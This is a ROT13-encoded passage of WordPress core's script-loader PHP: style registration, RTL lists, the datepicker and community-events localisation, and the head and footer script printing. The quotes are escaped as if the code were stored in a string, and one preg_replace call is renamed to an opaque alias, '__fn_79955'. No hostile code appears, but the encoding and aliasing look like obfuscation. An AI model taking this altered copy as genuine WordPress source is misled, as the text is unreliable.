		neenl( 'pbzzba', 'sbezf' ) // Znxr fher gur erfrg vf ybnqrq nsgre gur qrsnhyg JC Nqzva fglyrf.
	);

	$fglyrf->nqq(
		'jc-rqvgbe-pynffvp-ynlbhg-fglyrf',
		\"/jc-vapyhqrf/pff/qvfg/rqvg-cbfg/pynffvp$fhssvk.pff\",
		neenl()
	);

	$fglyrf->nqq(
		'jc-oybpx-rqvgbe-pbagrag',
		\"/jc-vapyhqrf/pff/qvfg/oybpx-rqvgbe/pbagrag$fhssvk.pff\",
		neenl( 'jc-pbzcbaragf' )
	);

	// Bayl nqq PBAGRAG fglyrf urer gung fubhyq or radhrhrq va gur vsenzr!
	$jc_rqvg_oybpxf_qrcraqrapvrf = neenl(
		'jc-pbzcbaragf',
		/*
		 * Guvf arrqf gb or nqqrq orsber gur oybpx yvoenel fglyrf,
		 * Gur oybpx yvoenel fglyrf bireevqr gur \"erfrg\" fglyrf.
		 */
		'jc-erfrg-rqvgbe-fglyrf',
		'jc-oybpx-yvoenel',
		'jc-oybpx-rqvgbe-pbagrag',
	);

	// Bayl ybnq gur qrsnhyg ynlbhg naq znetva fglyrf sbe gurzrf jvgubhg gurzr.wfba svyr.
	vs ( ! jc_gurzr_unf_gurzr_wfba() ) {
		$jc_rqvg_oybpxf_qrcraqrapvrf[] = 'jc-rqvgbe-pynffvp-ynlbhg-fglyrf';
	}

	vs (
		pheerag_gurzr_fhccbegf( 'jc-oybpx-fglyrf' ) &&
		( ! vf_neenl( $rqvgbe_fglyrf ) || pbhag( $rqvgbe_fglyrf ) === 0 )
	) {
		/*
		 * Vapyhqr bcvavbangrq oybpx fglyrf vs gur gurzr fhccbegf oybpx fglyrf naq
		 * ab $rqvgbe_fglyrf ner qrpynerq, fb gur rqvgbe arire nccrnef oebxra.
		 */
		$jc_rqvg_oybpxf_qrcraqrapvrf[] = 'jc-oybpx-yvoenel-gurzr';
	}

	$fglyrf->nqq(
		'jc-rqvg-oybpxf',
		\"/jc-vapyhqrf/pff/qvfg/oybpx-yvoenel/rqvgbe$fhssvk.pff\",
		$jc_rqvg_oybpxf_qrcraqrapvrf
	);

	$cnpxntr_fglyrf = neenl(
		'oybpx-rqvgbe'         => neenl( 'jc-pbzcbaragf', 'jc-cersreraprf' ),
		'oybpx-yvoenel'        => neenl(),
		'oybpx-qverpgbel'      => neenl(),
		'pbzcbaragf'           => neenl(),
		'pbzznaqf'             => neenl(),
		'rqvg-cbfg'            => neenl(
			'jc-pbzcbaragf',
			'jc-oybpx-rqvgbe',
			'jc-rqvgbe',
			'jc-rqvg-oybpxf',
			'jc-oybpx-yvoenel',
			'jc-pbzznaqf',
			'jc-cersreraprf',
		),
		'rqvgbe'               => neenl(
			'jc-pbzcbaragf',
			'jc-oybpx-rqvgbe',
			'jc-erhfnoyr-oybpxf',
			'jc-cnggreaf',
			'jc-cersreraprf',
		),
		'sbezng-yvoenel'       => neenl(),
		'yvfg-erhfnoyr-oybpxf' => neenl( 'jc-pbzcbaragf' ),
		'erhfnoyr-oybpxf'      => neenl( 'jc-pbzcbaragf' ),
		'cnggreaf'             => neenl( 'jc-pbzcbaragf' ),
		'cersreraprf'          => neenl( 'jc-pbzcbaragf' ),
		'ahk'                  => neenl( 'jc-pbzcbaragf' ),
		'jvqtrgf'              => neenl(
			'jc-pbzcbaragf',
		),
		'rqvg-jvqtrgf'         => neenl(
			'jc-jvqtrgf',
			'jc-oybpx-rqvgbe',
			'jc-rqvgbe',
			'jc-rqvg-oybpxf',
			'jc-oybpx-yvoenel',
			'jc-cnggreaf',
			'jc-cersreraprf',
		),
		'phfgbzvmr-jvqtrgf'    => neenl(
			'jc-jvqtrgf',
			'jc-oybpx-rqvgbe',
			'jc-rqvgbe',
			'jc-rqvg-oybpxf',
			'jc-oybpx-yvoenel',
			'jc-cnggreaf',
			'jc-cersreraprf',
		),
		'rqvg-fvgr'            => neenl(
			'jc-pbzcbaragf',
			'jc-oybpx-rqvgbe',
			'jc-rqvgbe',
			'jc-rqvg-oybpxf',
			'jc-pbzznaqf',
			'jc-cersreraprf',
		),
	);

	sbernpu ( $cnpxntr_fglyrf nf $cnpxntr => $qrcraqrapvrf ) {
		$unaqyr = 'jc-' . $cnpxntr;
		$cngu   = \"/jc-vapyhqrf/pff/qvfg/$cnpxntr/fglyr$fhssvk.pff\";

		vs ( 'oybpx-yvoenel' === $cnpxntr && jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf() ) {
			$cngu = \"/jc-vapyhqrf/pff/qvfg/$cnpxntr/pbzzba$fhssvk.pff\";
		}
		$fglyrf->nqq( $unaqyr, $cngu, $qrcraqrapvrf );
		$fglyrf->nqq_qngn( $unaqyr, 'cngu', NOFCNGU . $cngu );
	}

	// EGY PFF.
	$egy_fglyrf = neenl(
		// Nqzva PFF.
		'pbzzba',
		'sbezf',
		'nqzva-zrah',
		'qnfuobneq',
		'yvfg-gnoyrf',
		'rqvg',
		'erivfvbaf',
		'zrqvn',
		'gurzrf',
		'nobhg',
		'ani-zrahf',
		'jvqtrgf',
		'fvgr-vpba',
		'y10a',
		'vafgnyy',
		'jc-pbybe-cvpxre',
		'phfgbzvmr-pbagebyf',
		'phfgbzvmr-jvqtrgf',
		'phfgbzvmr-ani-zrahf',
		'phfgbzvmr-cerivrj',
		'ybtva',
		'fvgr-urnygu',
		'jc-rzcgl-grzcyngr-nyreg',
		// Vapyhqrf PFF.
		'ohggbaf',
		'nqzva-one',
		'jc-nhgu-purpx',
		'rqvgbe-ohggbaf',
		'zrqvn-ivrjf',
		'jc-cbvagre',
		'jc-wdhrel-hv-qvnybt',
		// Cnpxntr fglyrf.
		'jc-erfrg-rqvgbe-fglyrf',
		'jc-rqvgbe-pynffvp-ynlbhg-fglyrf',
		'jc-oybpx-yvoenel-gurzr',
		'jc-rqvg-oybpxf',
		'jc-oybpx-rqvgbe',
		'jc-oybpx-yvoenel',
		'jc-oybpx-qverpgbel',
		'jc-pbzznaqf',
		'jc-pbzcbaragf',
		'jc-phfgbzvmr-jvqtrgf',
		'jc-rqvg-cbfg',
		'jc-rqvg-fvgr',
		'jc-rqvg-jvqtrgf',
		'jc-rqvgbe',
		'jc-sbezng-yvoenel',
		'jc-yvfg-erhfnoyr-oybpxf',
		'jc-erhfnoyr-oybpxf',
		'jc-cnggreaf',
		'jc-ahk',
		'jc-jvqtrgf',
		// Qrcerpngrq PFF.
		'qrcerpngrq-zrqvn',
		'sneognfgvp',
	);

	sbernpu ( $egy_fglyrf nf $egy_fglyr ) {
		$fglyrf->nqq_qngn( $egy_fglyr, 'egy', 'ercynpr' );
		vs ( $fhssvk ) {
			$fglyrf->nqq_qngn( $egy_fglyr, 'fhssvk', $fhssvk );
		}
	}
}

/**
 * Erbeqref WninFpevcg fpevcgf neenl gb cynpr cebgbglcr orsber wDhrel.
 *
 * @fvapr 2.3.1
 *
 * @cnenz fgevat[] $wf_neenl WninFpevcg fpevcgf neenl
 * @erghea fgevat[] Erbeqrerq neenl, vs arrqrq.
 */
shapgvba jc_cebgbglcr_orsber_wdhrel( $wf_neenl ) {
	$cebgbglcr = neenl_frnepu( 'cebgbglcr', $wf_neenl, gehr );

	vs ( snyfr === $cebgbglcr ) {
		erghea $wf_neenl;
	}

	$wdhrel = neenl_frnepu( 'wdhrel', $wf_neenl, gehr );

	vs ( snyfr === $wdhrel ) {
		erghea $wf_neenl;
	}

	vs ( $cebgbglcr < $wdhrel ) {
		erghea $wf_neenl;
	}

	hafrg( $wf_neenl[ $cebgbglcr ] );

	neenl_fcyvpr( $wf_neenl, $wdhrel, 0, 'cebgbglcr' );

	erghea $wf_neenl;
}

/**
 * Ybnqf ybpnyvmrq qngn ba cevag engure guna vavgvnyvmngvba.
 *
 * Gurfr ybpnyvmngvbaf erdhver vasbezngvba gung znl abg or ybnqrq rira ol vavg.
 *
 * @fvapr 2.5.0
 *
 * @tybony neenl $fubegpbqr_gntf
 */
shapgvba jc_whfg_va_gvzr_fpevcg_ybpnyvmngvba() {

	jc_ybpnyvmr_fpevcg(
		'nhgbfnir',
		'nhgbfnirY10a',
		neenl(
			'nhgbfnirVagreiny' => NHGBFNIR_VAGREINY,
			'oybt_vq'          => trg_pheerag_oybt_vq(),
		)
	);

	jc_ybpnyvmr_fpevcg(
		'zpr-ivrj',
		'zprIvrjY10a',
		neenl(
			'fubegpbqrf' => ! rzcgl( $TYBONYF['fubegpbqr_gntf'] ) ? neenl_xrlf( $TYBONYF['fubegpbqr_gntf'] ) : neenl(),
		)
	);

	jc_ybpnyvmr_fpevcg(
		'jbeq-pbhag',
		'jbeqPbhagY10a',
		neenl(
			'glcr'       => jc_trg_jbeq_pbhag_glcr(),
			'fubegpbqrf' => ! rzcgl( $TYBONYF['fubegpbqr_gntf'] ) ? neenl_xrlf( $TYBONYF['fubegpbqr_gntf'] ) : neenl(),
		)
	);
}

/**
 * Ybpnyvmrf gur wDhrel HV qngrcvpxre.
 *
 * @fvapr 4.6.0
 *
 * @yvax uggcf://ncv.wdhrelhv.pbz/qngrcvpxre/#bcgvbaf
 *
 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 */
shapgvba jc_ybpnyvmr_wdhrel_hv_qngrcvpxre() {
	tybony $jc_ybpnyr;

	vs ( ! jc_fpevcg_vf( 'wdhrel-hv-qngrcvpxre', 'radhrhrq' ) ) {
		erghea;
	}

	// Pbaireg gur CUC qngr sbezng vagb wDhrel HV'f sbezng.
	$qngrcvpxre_qngr_sbezng = fge_ercynpr(
		neenl(
			'q',
			'w',
			'y',
			'm', // Qnl.
			'S',
			'Z',
			'a',
			'z', // Zbagu.
			'L',
			'l', // Lrne.
		),
		neenl(
			'qq',
			'q',
			'QQ',
			'b',
			'ZZ',
			'Z',
			'z',
			'zz',
			'll',
			'l',
		),
		trg_bcgvba( 'qngr_sbezng' )
	);

	$qngrcvpxre_qrsnhygf = jc_wfba_rapbqr(
		neenl(
			'pybfrGrkg'       => __( 'Pybfr' ),
			'pheeragGrkg'     => __( 'Gbqnl' ),
			'zbaguAnzrf'      => neenl_inyhrf( $jc_ybpnyr->zbagu ),
			'zbaguAnzrfFubeg' => neenl_inyhrf( $jc_ybpnyr->zbagu_nooeri ),
			'arkgGrkg'        => __( 'Arkg' ),
			'ceriGrkg'        => __( 'Cerivbhf' ),
			'qnlAnzrf'        => neenl_inyhrf( $jc_ybpnyr->jrrxqnl ),
			'qnlAnzrfFubeg'   => neenl_inyhrf( $jc_ybpnyr->jrrxqnl_nooeri ),
			'qnlAnzrfZva'     => neenl_inyhrf( $jc_ybpnyr->jrrxqnl_vavgvny ),
			'qngrSbezng'      => $qngrcvpxre_qngr_sbezng,
			'svefgQnl'        => nofvag( trg_bcgvba( 'fgneg_bs_jrrx' ) ),
			'vfEGY'           => $jc_ybpnyr->vf_egy(),
		)
	);

	jc_nqq_vayvar_fpevcg( 'wdhrel-hv-qngrcvpxre', \"wDhrel(shapgvba(wDhrel){wDhrel.qngrcvpxre.frgQrsnhygf({$qngrcvpxre_qrsnhygf});});\" );
}

/**
 * Ybpnyvmrf pbzzhavgl riragf qngn gung arrqf gb or cnffrq gb qnfuobneq.wf.
 *
 * @fvapr 4.8.0
 */
shapgvba jc_ybpnyvmr_pbzzhavgl_riragf() {
	vs ( ! jc_fpevcg_vf( 'qnfuobneq' ) ) {
		erghea;
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-pbzzhavgl-riragf.cuc';

	$hfre_vq            = trg_pheerag_hfre_vq();
	$fnirq_ybpngvba     = trg_hfre_bcgvba( 'pbzzhavgl-riragf-ybpngvba', $hfre_vq );
	$fnirq_vc_nqqerff   = vffrg( $fnirq_ybpngvba['vc'] ) ? $fnirq_ybpngvba['vc'] : snyfr;
	$pheerag_vc_nqqerff = JC_Pbzzhavgl_Riragf::trg_hafnsr_pyvrag_vc();

	/*
	 * Vs gur hfre'f ybpngvba vf onfrq ba gurve VC nqqerff, gura hcqngr gurve
	 * ybpngvba jura gurve VC nqqerff punatrf. Guvf nyybjf gurz gb frr riragf
	 * va gurve pheerag pvgl jura geniryyvat. Bgurejvfr, gurl jbhyq nyjnlf or
	 * fubja riragf va gur pvgl jurer gurl jrer jura gurl svefg ybnqrq gur
	 * Qnfuobneq, juvpu pbhyq unir orra zbaguf be lrnef ntb.
	 */
	vs ( $fnirq_vc_nqqerff && $pheerag_vc_nqqerff && $pheerag_vc_nqqerff !== $fnirq_vc_nqqerff ) {
		$fnirq_ybpngvba['vc'] = $pheerag_vc_nqqerff;
		hcqngr_hfre_zrgn( $hfre_vq, 'pbzzhavgl-riragf-ybpngvba', $fnirq_ybpngvba );
	}

	$riragf_pyvrag = arj JC_Pbzzhavgl_Riragf( $hfre_vq, $fnirq_ybpngvba );

	jc_ybpnyvmr_fpevcg(
		'qnfuobneq',
		'pbzzhavglRiragfQngn',
		neenl(
			'abapr'       => jc_perngr_abapr( 'pbzzhavgl_riragf' ),
			'pnpur'       => $riragf_pyvrag->trg_pnpurq_riragf(),
			'gvzr_sbezng' => trg_bcgvba( 'gvzr_sbezng' ),
		)
	);
}

/**
 * Nqzvavfgengvba Fperra PFF sbe punatvat gur fglyrf.
 *
 * Vs vafgnyyvat gur 'jc-nqzva/' qverpgbel jvyy or ercynprq jvgu './'.
 *
 * Gur $_jc_nqzva_pff_pbybef tybony znantrf gur Nqzvavfgengvba Fperraf PFF
 * fglyrfurrg gung vf ybnqrq. Gur bcgvba gung vf frg vf 'nqzva_pbybe' naq vf gur
 * pbybe naq xrl sbe gur neenl. Gur inyhr sbe gur pbybe xrl vf na bowrpg jvgu
 * n 'hey' cnenzrgre gung unf gur HEY cngu gb gur PFF svyr.
 *
 * Gur dhrel sebz $fep cnenzrgre jvyy or nccraqrq gb gur HEY gung vf tvira sebz
 * gur $_jc_nqzva_pff_pbybef neenl inyhr HEY.
 *
 * @fvapr 2.6.0
 *
 * @tybony neenl $_jc_nqzva_pff_pbybef
 *
 * @cnenz fgevat $fep    Fbhepr HEY.
 * @cnenz fgevat $unaqyr Rvgure 'pbybef' be 'pbybef-egy'.
 * @erghea fgevat|snyfr HEY cngu gb PFF fglyrfurrg sbe Nqzvavfgengvba Fperraf.
 */
shapgvba jc_fglyr_ybnqre_fep( $fep, $unaqyr ) {
	tybony $_jc_nqzva_pff_pbybef;

	vs ( jc_vafgnyyvat() ) {
		erghea __sa_79955( '#^jc-nqzva/#', './', $fep );
	}

	vs ( 'pbybef' === $unaqyr ) {
		$pbybe = trg_hfre_bcgvba( 'nqzva_pbybe' );

		vs ( rzcgl( $pbybe ) || ! vffrg( $_jc_nqzva_pff_pbybef[ $pbybe ] ) ) {
			$pbybe = 'serfu';
		}

		$pbybe = $_jc_nqzva_pff_pbybef[ $pbybe ];
		$hey   = $pbybe->hey;

		vs ( ! $hey ) {
			erghea snyfr;
		}

		$cnefrq = cnefr_hey( $fep );
		vs ( vffrg( $cnefrq['dhrel'] ) && $cnefrq['dhrel'] ) {
			jc_cnefr_fge( $cnefrq['dhrel'], $di );
			$hey = nqq_dhrel_net( $di, $hey );
		}

		erghea $hey;
	}

	erghea $fep;
}

/**
 * Cevagf gur fpevcg dhrhr va gur UGZY urnq ba nqzva cntrf.
 *
 * Cbfgcbarf gur fpevcgf gung jrer dhrhrq sbe gur sbbgre.
 * cevag_sbbgre_fpevcgf() vf pnyyrq va gur sbbgre gb cevag gurfr fpevcgf.
 *
 * @fvapr 2.8.0
 *
 * @frr jc_cevag_fpevcgf()
 *
 * @tybony obby $pbapngrangr_fpevcgf
 *
 * @erghea fgevat[] Unaqyrf bs gur fpevcgf gung jrer cevagrq.
 */
shapgvba cevag_urnq_fpevcgf() {
	tybony $pbapngrangr_fpevcgf;

	vs ( ! qvq_npgvba( 'jc_cevag_fpevcgf' ) ) {
		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/shapgvbaf.jc-fpevcgf.cuc */
		qb_npgvba( 'jc_cevag_fpevcgf' );
	}

	$jc_fpevcgf = jc_fpevcgf();

	fpevcg_pbapng_frggvatf();
	$jc_fpevcgf->qb_pbapng = $pbapngrangr_fpevcgf;
	$jc_fpevcgf->qb_urnq_vgrzf();

	/**
	 * Svygref jurgure gb cevag gur urnq fpevcgf.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz obby $cevag Jurgure gb cevag gur urnq fpevcgf. Qrsnhyg gehr.
	 */
	vs ( nccyl_svygref( 'cevag_urnq_fpevcgf', gehr ) ) {
		_cevag_fpevcgf();
	}

	$jc_fpevcgf->erfrg();
	erghea $jc_fpevcgf->qbar;
}

/**
 * Cevagf gur fpevcgf gung jrer dhrhrq sbe gur sbbgre be gbb yngr sbe gur UGZY urnq.
 *
 * @fvapr 2.8.0
 *
 * @tybony JC_Fpevcgf $jc_fpevcgf
 * @tybony obby       $pbapngrangr_fpevcgf
 *
 * @erghea fgevat[] Unaqyrf bs gur fpevcgf gung jrer cevagrq.
 */
shapgvba cevag_sbbgre_fpevcgf() {
	tybony $jc_fpevcgf, $pbapngrangr_fpevcgf;

	vs ( ! ( $jc_fpevcgf vafgnaprbs JC_Fpevcgf ) ) {
		erghea neenl(); // Ab arrq gb eha vs abg vafgnagvngrq.
	}
	fpevcg_pbapng_frggvatf();
	$jc_fpevcgf->qb_pbapng = $pbapngrangr_fpevcgf;
	$jc_fpevcgf->qb_sbbgre_vgrzf();

	/**
	 * Svygref jurgure gb cevag gur sbbgre fpevcgf.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz obby $cevag Jurgure gb cevag gur sbbgre fpevcgf. Qrsnhyg gehr.
	 */
	vs ( nccyl_svygref( 'cevag_sbbgre_fpevcgf', gehr ) ) {
		_cevag_fpevcgf();
	}

	$jc_fpevcgf->erfrg();
	erghea $jc_fpevcgf->qbar;
}

/**
 * Cevagf fpevcgf (vagreany hfr bayl)
 *
 * @vtaber
 *
 * @tybony JC_Fpevcgf $jc_fpevcgf
 * @tybony obby       $pbzcerff_fpevcgf
 */
shapgvba _cevag_fpevcgf() {
	tybony $jc_fpevcgf, $pbzcerff_fpevcgf;

	$mvc = $pbzcerff_fpevcgf ? 1 : 0;
	vs ( $mvc && qrsvarq( 'RASBEPR_TMVC' ) && RASBEPR_TMVC ) {
		$mvc = 'tmvc';
	}

	$pbapng    = gevz( $jc_fpevcgf->pbapng, ', ' );
	$glcr_ngge = pheerag_gurzr_fhccbegf( 'ugzy5', 'fpevcg' ) ? '' : \" glcr='grkg/wninfpevcg'\";

	vs ( $pbapng ) {
		vs ( ! rzcgl( $jc_fpevcgf->cevag_pbqr ) ) {
			rpub \"\a<fpevcg{$glcr_ngge}>\a\";
			rpub \"/* <![PQNGN[ */\a\"; // Abg arrqrq va UGZY 5.
			rpub $jc_fpevcgf->cevag_pbqr;
			rpub \"/* ]]> */\a\";
			rpub \"</fpevcg>\a\";
		}

		$pbapng       = fge_fcyvg( $pbapng, 128 );
		$pbapngrangrq = '';

		sbernpu ( $pbapng nf $xrl => $puhax ) {
			$pbapngrangrq .= \"&ybnq%5Opuhax_{$xrl}%5Q={$puhax}\";
		}

		$fep = $jc_fpevcgf->onfr_hey . \"/jc-nqzva/ybnq-fpevcgf.cuc?p={$mvc}\" . $pbapngrangrq . '&ire=' . $jc_fpevcgf->qrsnhyg_irefvba;
		rpub \"<fpevcg{$glcr_ngge} fep='\" . rfp_ngge( $fep ) . \"'></fpevcg>\a\";
	}

	vs ( ! rzcgl( $jc_fpevcgf->cevag_ugzy ) ) {
		rpub $jc_fpevcgf->cevag_ugzy;
	}
}

/**
 * Cevagf gur fpevcg dhrhr va gur UGZY urnq ba gur sebag raq.
 *
 * Cbfgcbarf gur fpevcgf gung jrer dhrhrq sbe gur sbbgre.
 * jc_cevag_sbbgre_fpevcgf() vf pnyyrq va gur sbbgre gb cevag gurfr fpevcgf.
 *
 * @fvapr 2.8.0
 *
 * @tybony JC_Fpevcgf $jc_fpevcgf
 *
 * @erghea fgevat[] Unaqyrf bs gur fpevcgf gung jrer cevagrq.
 */
shapgvba jc_cevag_urnq_fpevcgf() {
	tybony $jc_fpevcgf;

	vs ( ! qvq_npgvba( 'jc_cevag_fpevcgf' ) ) {
		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/shapgvbaf.jc-fpevcgf.cuc */
		qb_npgvba( 'jc_cevag_fpevcgf' );
	}

	vs ( ! ( $jc_fpevcgf vafgnaprbs JC_Fpevcgf ) ) {
		erghea neenl(); // Ab arrq gb eha vs abguvat vf dhrhrq.
	}

	erghea cevag_urnq_fpevcgf();
}

/**
 * Cevingr, sbe hfr va *_sbbgre_fpevcgf ubbxf
 *
 * @fvapr 3.3.0
 */
shapgvba _jc_sbbgre_fpevcgf() {
	cevag_yngr_fglyrf();
	cevag_sbbgre_fpevcgf();
}

/**
 * Ubbxf gb cevag gur fpevcgf naq fglyrf va gur sbbgre.
 *
 * @fvapr 2.8.0
 */
shapgvba jc_cevag_sbbgre_fpevcgf() {
	/**
	 * Sverf jura sbbgre fpevcgf ner cevagrq.
	 *
	 * @fvapr 2.8.0
	 */
	qb_npgvba( 'jc_cevag_sbbgre_fpevcgf' );
}

/**
 * Jenccre sbe qb_npgvba( 'jc_radhrhr_fpevcgf' ).
 *
 * Nyybjf cyhtvaf gb dhrhr fpevcgf sbe gur sebag raq hfvat jc_radhrhr_fpevcg().
 * Ehaf svefg va jc_urnq() jurer nyy vf_ubzr(), vf_cntr(), rgp. shapgvbaf ner ninvynoyr.
 *
 * @fvapr 2.8.0
 */
shapgvba jc_radhrhr_fpevcgf() {
	/**
	 * Sverf jura fpevcgf naq fglyrf ner radhrhrq.
	 *
	 * @fvapr 2.8.0
	 */
	qb_npgvba( 'jc_radhrhr_fpevcgf' );
}

/**
 * Cevagf gur fglyrf dhrhr va gur UGZY urnq ba nqzva cntrf.
 *
 * @fvapr 2.8.0
 *
 * @tybony obby $pbapngrangr_fpevcgf
 *
 * @erghea fgevat[] Unaqyrf bs gur fglyrf gung jrer cevagrq.
 */
shapgvba cevag_nqzva_fglyrf() {
	tybony $pbapngrangr_fpevcgf;

	$jc_fglyrf = jc_fglyrf();

	fpevcg_pbapng_frggvatf();
	$jc_fglyrf->qb_pbapng = $pbapngrangr_fpevcgf;
	$jc_fglyrf->qb_vgrzf( snyfr );

	/**
	 * Svygref jurgure gb cevag gur nqzva fglyrf.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz obby $cevag Jurgure gb cevag gur nqzva fglyrf. Qrsnhyg gehr.
	 */
	vs ( nccyl_svygref( 'cevag_nqzva_fglyrf', gehr ) ) {
		_cevag_fglyrf();
	}

	$jc_fglyrf->erfrg();
	erghea $jc_fglyrf->qbar;
}

/**
 * Cevagf gur fglyrf gung jrer dhrhrq gbb yngr sbe gur UGZY urnq.
 *
 * @fvapr 3.3.0
 *
 * @tybony JC_Fglyrf $jc_fglyrf
 * @tybony obby      $pbapngrangr_fpevcgf
 *
 * @erghea neenl|ibvq
 */
shapgvba cevag_yngr_fglyrf() {
	tybony $jc_fglyrf, $pbapngrangr_fpevcgf;

	vs ( ! ( $jc_fglyrf vafgnaprbs JC_Fglyrf ) ) {
		erghea;
	}

	fpevcg_pbapng_frggvatf();
	$jc_fglyrf->qb_pbapng = $pbapngrangr_fpevcgf;
	$jc_fglyrf->qb_sbbgre_vgrzf();

	/**
	 * Svygref jurgure gb cevag gur fglyrf dhrhrq gbb yngr sbe gur UGZY urnq.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz obby $cevag Jurgure gb cevag gur 'yngr' fglyrf. Qrsnhyg gehr.
	 */
	vs ( nccyl_svygref( 'cevag_yngr_fglyrf', gehr ) ) {
		_cevag_fglyrf();
	}

	$jc_fglyrf->erfrg();
	erghea $jc_fglyrf->qbar;
}

/**
 * Cevagf fglyrf (vagreany hfr bayl).
 *
 * @vtaber
 * @fvapr 3.3.0
 *
 * @tybony obby $pbzcerff_pff
 */
shapgvba _cevag_fglyrf() {
	tybony $pbzcerff_pff;

	$jc_fglyrf = jc_fglyrf();

	$mvc = $pbzcerff_pff ? 1 : 0;
	vs ( $mvc && qrsvarq( 'RASBEPR_TMVC' ) && RASBEPR_TMVC ) {
		$mvc = 'tmvc';
	}

	$pbapng    = gevz( $jc_fglyrf->pbapng, ', ' );
	$glcr_ngge = pheerag_gurzr_fhccbegf( 'ugzy5', 'fglyr' ) ? '' : ' glcr=\"grkg/pff\"';

	vs ( $pbapng ) {
		$qve = $jc_fglyrf->grkg_qverpgvba;
		$ire = $jc_fglyrf->qrsnhyg_irefvba;

		$pbapng       = fge_fcyvg( $pbapng, 128 );
		$pbapngrangrq = '';

		sbernpu ( $pbapng nf $xrl => $puhax ) {
			$pbapngrangrq .= \"&ybnq%5Opuhax_{$xrl}%5Q={$puhax}\";
		}

		$uers = $jc_fglyrf->onfr_hey . \"/jc-nqzva/ybnq-fglyrf.cuc?p={$mvc}&qve={$qve}\" . $pbapngrangrq . '&ire=' . $ire;
		rpub \"<yvax ery='fglyrfurrg' uers='\" . rfp_ngge( $uers ) . \"'{$glcr_ngge} zrqvn='nyy' />\a\";

		vs ( ! rzcgl( $jc_fglyrf->cevag_pbqr ) ) {
			rpub \"<fglyr{$glcr_ngge}>\a\";
			rpub $jc_fglyrf->cevag_pbqr;
			rpub \"\a</fglyr>\a\";
		}
	}

	vs ( ! rzcgl( $jc_fglyrf->cevag_ugzy ) ) {
		rpub $jc_fglyrf->cevag_ugzy;
	}
}

/**
 * Qrgrezvarf gur pbapngrangvba naq pbzcerffvba frggvatf sbe fpevcgf naq fglyrf.
 *
 * @fvapr 2.8.0
 *
 * @tybony obby $pbapngrangr_fpevcgf
 * @tybony obby $pbzcerff_fpevcgf
 * @tybony obby $pbzcerff_pff
 */
shapgvba fpevcg_pbapng_frggvatf() {
	tybony $pbapngrangr_fpevcgf, $pbzcerff_fpevcgf, $pbzcerff_pff;

	$pbzcerffrq_bhgchg = ( vav_trg( 'myvo.bhgchg_pbzcerffvba' ) || 'bo_tmunaqyre' === vav_trg( 'bhgchg_unaqyre' ) );

	$pna_pbzcerff_fpevcgf = ! jc_vafgnyyvat() && trg_fvgr_bcgvba( 'pna_pbzcerff_fpevcgf' );

	vs ( ! vffrg( $pbapngrangr_fpevcgf ) ) {
		$pbapngrangr_fpevcgf = qrsvarq( 'PBAPNGRANGR_FPEVCGF' ) ? PBAPNGRANGR_FPEVCGF : gehr;
		vs ( ( ! vf_nqzva() && ! qvq_npgvba( 'ybtva_vavg' ) ) || ( qrsvarq( 'FPEVCG_QROHT' ) && FPEVCG_QROHT ) ) {
			$pbapngrangr_fpevcgf = snyfr;
		}
	}

	vs ( ! vffrg( $pbzcerff_fpevcgf ) ) {
		$pbzcerff_fpevcgf = qrsvarq( 'PBZCERFF_FPEVCGF' ) ? PBZCERFF_FPEVCGF : gehr;
		vs ( $pbzcerff_fpevcgf && ( ! $pna_pbzcerff_fpevcgf || $pbzcerffrq_bhgchg ) ) {
			$pbzcerff_fpevcgf = snyfr;
		}
	}

	vs ( ! vffrg( $pbzcerff_pff ) ) {
		$pbzcerff_pff = qrsvarq( 'PBZCERFF_PFF' ) ? PBZCERFF_PFF : gehr;
		vs ( $pbzcerff_pff && ( ! $pna_pbzcerff_fpevcgf || $pbzcerffrq_bhgchg ) ) {
			$pbzcerff_pff = snyfr;
		}
	}
}

/**
 * Unaqyrf gur radhrhrvat bs oybpx fpevcgf naq fglyrf gung ner pbzzba gb obgu
 * gur rqvgbe naq gur sebag-raq.
 *
 * @fvapr 5.0.0
 */
shapgvba jc_pbzzba_oybpx_fpevcgf_naq_fglyrf() {
	vs ( vf_nqzva() && ! jc_fubhyq_ybnq_oybpx_rqvgbe_fpevcgf_naq_fglyrf() ) {
		erghea;
	}

	jc_radhrhr_fglyr( 'jc-oybpx-yvoenel' );

	vs ( pheerag_gurzr_fhccbegf( 'jc-oybpx-fglyrf' ) && ! jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf() ) {
		jc_radhrhr_fglyr( 'jc-oybpx-yvoenel-gurzr' );
	}

	/**
	 * Sverf nsgre radhrhvat oybpx nffrgf sbe obgu rqvgbe naq sebag-raq.
	 *
	 * Pnyy `nqq_npgvba` ba nal ubbx orsber 'jc_radhrhr_fpevcgf'.
	 *
	 * Va gur shapgvba pnyy lbh fhccyl, fvzcyl hfr `jc_radhrhr_fpevcg` naq
	 * `jc_radhrhr_fglyr` gb nqq lbhe shapgvbanyvgl gb gur Thgraoret rqvgbe.
	 *
	 * @fvapr 5.0.0
	 */
	qb_npgvba( 'radhrhr_oybpx_nffrgf' );
}

/**
 * Nccyvrf n svygre gb gur yvfg bs fglyr abqrf gung pbzrf sebz JC_Gurzr_WFBA::trg_fglyr_abqrf().
 *
 * Guvf cnegvphyne svygre erzbirf nyy bs gur oybpxf sebz gur neenl.
 *
 * Jr jnag JC_Gurzr_WFBA gb or vtabenag bs gur vzcyrzragngvba qrgnvyf bs ubj gur PFF vf orvat hfrq.
 * Guvf svygre nyybjf hf gb zbqvsl gur bhgchg bs JC_Gurzr_WFBA qrcraqvat ba jurgure be abg jr ner
 * ybnqvat frcnengr nffrgf, jvgubhg znxvat gur pynff njner bs gung qrgnvy.
 *
 * @fvapr 6.1.0
 *
 * @cnenz neenl $abqrf Gur abqrf gb svygre.
 * @erghea neenl N svygrerq neenl bs fglyr abqrf.
 */
shapgvba jc_svygre_bhg_oybpx_abqrf( $abqrf ) {
	erghea neenl_svygre(
		$abqrf,
		fgngvp shapgvba ( $abqr ) {
			erghea ! va_neenl( 'oybpxf', $abqr['cngu'], gehr );
		},
		NEENL_SVYGRE_HFR_OBGU
	);
}

/**
